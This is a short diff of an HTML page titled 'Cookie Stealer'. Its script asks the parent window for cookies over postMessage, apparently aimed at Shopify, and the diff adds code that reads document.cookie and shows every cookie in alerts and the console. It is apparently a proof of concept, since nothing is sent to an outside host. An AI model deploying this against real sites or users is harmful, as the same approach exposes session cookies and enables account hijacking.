@@ -3,10 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Steale8989r</title>
+    <title>Cookie Stealers0000</title>
 </head>
 <body>
     <script>
+        // Function to get all cookies
+        function getAllCookies() {
+            let cookies = document.cookie.split(';');
+            let cookiesObject = {};
+            cookies.forEach(cookie => {
+                let [key, value] = cookie.split('=').map(c => c.trim());
+                cookiesObject[key] = value;
+            });
+            return cookiesObject;
+        }
+
         // Function to send a message to the parent window
         function sendMessageToParent() {
             const message = { type: 'getCookies' };
@@ -16,12 +27,17 @@
         // Listen for messages from the parent window
         window.addEventListener('message', function(event) {
             if (event.data && event.data.type === 'cookies') {
-                alert('Shopify Cookies: ' + event.data.cookies);
+                alert('Shopify Cookies: ' + JSON.stringify(event.data.cookies));
             }
         });
 
         // Send the initial message to the parent window
         sendMessageToParent();
+
+        // Display all cookies
+        const cookies = getAllCookies();
+        console.log('All Cookies:', cookies);
+        alert('All Cookies: ' + JSON.stringify(cookies));
     </script>
 </body>
 </html>
